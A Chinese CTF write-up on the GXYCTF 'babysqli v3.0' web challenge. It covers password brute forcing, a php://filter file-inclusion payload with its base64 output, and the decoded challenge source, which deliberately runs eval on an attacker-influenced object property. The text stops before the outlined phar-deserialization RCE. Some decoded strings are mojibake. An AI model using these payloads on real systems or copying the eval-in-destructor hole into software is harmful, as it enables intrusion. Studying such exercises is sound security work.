在这里我以后会收集一些供我自己复习的一些题目，增长各种各样的姿势，如果师傅们有更有意思的题，欢迎一起探讨一起学习

GXYCTF babysqli v3.0 phar反序列化
=
登录
LFI 读源码
phar 反序列化 RCE
非预期解法 1：直接 GETSHELL
非预期解法 2：读取 flag.php

登录
这个题目登录窗口简直和前两个 sqli 一样，但是 fuzz 后无果，考虑爆破。

前两个题的 username 都是 admin 所以这次也先爆破密码

![](https://www.gem-love.com/wp-content/uploads/2019/12/1-3-768x617.png)

设置好 payload 后开始爆破，两秒后爆破出密码为 password

![](https://www.gem-love.com/wp-content/uploads/2019/12/2-4-768x573.png)

LFI 读源码

登录成功后，自动跳转至

http://172.21.4.12:10041/home.php?file=upload
发现是个上传页面，上面明确写着

当前引用的是 upload.php
而 url 又有 file=upload，于是访问 upload.php，发现这两个页面一样，说明是文件包含

![](https://www.gem-love.com/wp-content/uploads/2019/12/3-5-1024x584.png)

简单扫一下目录发现存在 flag.php，尝试包含发现 flag 被 ban 了

![](https://www.gem-love.com/wp-content/uploads/2019/12/4-4-1024x274.png)

而包含其他文件，则会在后面拼接上.fxxkyou!

若包含的文件以 home 或 upload 结尾，则在后面拼接上.php 后包含；其他都被拼接上.fxxkyou!

文件包含因此我们可以使用伪协议读源码：

http://172.21.4.12:10041/home.php?file=php://filter/read=convert.base64-encode/resource=upload

当前引用的是 php://filter/read=convert.base64-encode/resource=upload.phpPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+IA0KDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCgnkuIrkvKDmlofku7YNCgk8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgLz4NCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSLkuIrkvKAiIC8+DQo8L2Zvcm0+DQoNCjw/cGhwDQplcnJvcl9yZXBvcnRpbmcoMCk7DQpjbGFzcyBVcGxvYWRlcnsNCglwdWJsaWMgJEZpbGVuYW1lOw0KCXB1YmxpYyAkY21kOw0KCXB1YmxpYyAkdG9rZW47DQoJDQoNCglmdW5jdGlvbiBfX2NvbnN0cnVjdCgpew0KCQkkc2FuZGJveCA9IGdldGN3ZCgpLiIvdXBsb2Fkcy8iLm1kNSgkX1NFU1NJT05bJ3VzZXInXSkuIi8iOw0KCQkkZXh0ID0gIi50eHQiOw0KCQlAbWtkaXIoJHNhbmRib3gsIDA3NzcsIHRydWUpOw0KCQlpZihpc3NldCgkX0dFVFsnbmFtZSddKSBhbmQgIXByZWdfbWF0Y2goIi9kYXRhOlwvXC8gfCBmaWx0ZXI6XC9cLyB8IHBocDpcL1wvIHwgXC4vaSIsICRfR0VUWyduYW1lJ10pKXsNCgkJCSR0aGlzLT5GaWxlbmFtZSA9ICRfR0VUWyduYW1lJ107DQoJCX0NCgkJZWxzZXsNCgkJCSR0aGlzLT5GaWxlbmFtZSA9ICRzYW5kYm94LiRfU0VTU0lPTlsndXNlciddLiRleHQ7DQoJCX0NCg0KCQkkdGhpcy0+Y21kID0gImVjaG8gJzxicj48YnI+TWFzdGVyLCBJIHdhbnQgdG8gc3R1ZHkgcml6aGFuITxicj48YnI+JzsiOw0KCQkkdGhpcy0+dG9rZW4gPSAkX1NFU1NJT05bJ3VzZXInXTsNCgl9DQoNCglmdW5jdGlvbiB1cGxvYWQoJGZpbGUpew0KCQlnbG9iYWwgJHNhbmRib3g7DQoJCWdsb2JhbCAkZXh0Ow0KDQoJCWlmKHByZWdfbWF0Y2goIlteYS16MC05XSIsICR0aGlzLT5GaWxlbmFtZSkpew0KCQkJJHRoaXMtPmNtZCA9ICJkaWUoJ2lsbGVnYWwgZmlsZW5hbWUhJyk7IjsNCgkJfQ0KCQllbHNlew0KCQkJaWYoJGZpbGVbJ3NpemUnXSA+IDEwMjQpew0KCQkJCSR0aGlzLT5jbWQgPSAiZGllKCd5b3UgYXJlIHRvbyBiaWcgKOKAsuKWvWDjgIMpJyk7IjsNCgkJCX0NCgkJCWVsc2V7DQoJCQkJJHRoaXMtPmNtZCA9ICJtb3ZlX3VwbG9hZGVkX2ZpbGUoJyIuJGZpbGVbJ3RtcF9uYW1lJ10uIicsICciIC4gJHRoaXMtPkZpbGVuYW1lIC4gIicpOyI7DQoJCQl9DQoJCX0NCgl9DQoNCglmdW5jdGlvbiBfX3RvU3RyaW5nKCl7DQoJCWdsb2JhbCAkc2FuZGJveDsNCgkJZ2xvYmFsICRleHQ7DQoJCS8vIHJldHVybiAkc2FuZGJveC4kdGhpcy0+RmlsZW5hbWUuJGV4dDsNCgkJcmV0dXJuICR0aGlzLT5GaWxlbmFtZTsNCgl9DQoNCglmdW5jdGlvbiBfX2Rlc3RydWN0KCl7DQoJCWlmKCR0aGlzLT50b2tlbiAhPSAkX1NFU1NJT05bJ3VzZXInXSl7DQoJCQkkdGhpcy0+Y21kID0gImRpZSgnY2hlY2sgdG9rZW4gZmFsaWVkIScpOyI7DQoJCX0NCgkJZXZhbCgkdGhpcy0+Y21kKTsNCgl9DQp9DQoNCmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXSkpIHsNCgkkdXBsb2FkZXIgPSBuZXcgVXBsb2FkZXIoKTsNCgkkdXBsb2FkZXItPnVwbG9hZCgkX0ZJTEVTWyJmaWxlIl0pOw0KCWlmKEBmaWxlX2dldF9jb250ZW50cygkdXBsb2FkZXIpKXsNCgkJZWNobyAi5LiL6Z2i5piv5L2g5LiK5Lyg55qE5paH5Lu277yaPGJyPiIuJHVwbG9hZGVyLiI8YnI+IjsNCgkJZWNobyBmaWxlX2dldF9jb250ZW50cygkdXBsb2FkZXIpOw0KCX0NCn0NCg0KPz4NCg==

base64 解码后得到 upload.php 的源码：

upload.php

```php
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 

<form action="" method="post" enctype="multipart/form-data">
	ä¸ä¼ æä»¶
	<input type="file" name="file" />
	<input type="submit" name="submit" value="ä¸ä¼ " />
</form>

<?php
error_reporting(0);
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
	

	function __construct(){
		$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
		$ext = ".txt";
		@mkdir($sandbox, 0777, true);
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
		else{
			$this->Filename = $sandbox.$_SESSION['user'].$ext;
		}

		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
		$this->token = $_SESSION['user'];
	}

	function upload($file){
		global $sandbox;
		global $ext;

		if(preg_match("[^a-z0-9]", $this->Filename)){    //不以数字和字母开头
			$this->cmd = "die('illegal filename!');";
		}
		else{
			if($file['size'] > 1024){
				$this->cmd = "die('you are too big (â²â½`ã)');";
			}
			else{
				$this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";   //上传
			}
		}
	}

	function __toString(){
		global $sandbox;
		global $ext;
		// return $sandbox.$this->Filename.$ext;
		return $this->Filename;
	}

	function __destruct(){
		if($this->token != $_SESSION['user']){
			$this->cmd = "die('check token falied!');";
		}
		eval($this->cmd);
	}
}

if(isset($_FILES['file'])) {
	$uploader = new Uploader();
	$uploader->upload($_FILES["file"]);
	if(@file_get_contents($uploader)){
		echo "ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼<br>".$uploader."<br>";
		echo file_get_contents($uploader);
	}
}

?>

```
home.php
```php
<?php
session_start();
echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <title>Home</title>";
error_reporting(0);
if(isset($_SESSION['user'])){
	if(isset($_GET['file'])){
		if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
			die("hacker!");
		}
		else{
			if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){
				$file = $_GET['file'].".php";
			}
			else{
				$file = $_GET['file'].".fxxkyou!";
			}
			echo "å½åå¼ç¨çæ¯ ".$file;
			require $file;
		}
		
	}
	else{
		die("no permission!");
	}
}
?>

```

